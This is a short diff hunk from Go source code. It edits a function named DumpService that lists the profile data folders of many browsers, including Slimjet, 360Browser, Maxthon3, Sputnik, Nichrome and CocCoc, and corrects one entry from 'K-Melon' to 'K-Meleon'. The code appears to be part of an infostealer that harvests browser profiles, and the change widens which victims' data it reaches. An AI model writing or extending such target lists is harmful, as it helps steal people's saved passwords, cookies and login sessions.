@@ -52,7 +52,7 @@ func DumpService() []string {
 		LOCAL + "\\Slimjet\\User Data\\Default",
 		LOCAL + "\\360Browser\\Browser\\User Data\\Default",
 		LOCAL + "\\Maxthon3\\User Data\\Default",
-		LOCAL + "\\K-Melon\\User Data\\Default",
+		LOCAL + "\\K-Meleon\\User Data\\Default",
 		LOCAL + "\\Sputnik\\Sputnik\\User Data\\Default",
 		LOCAL + "\\Nichrome\\User Data\\Default",
 		LOCAL + "\\CocCoc\\Browser\\User Data\\Default",
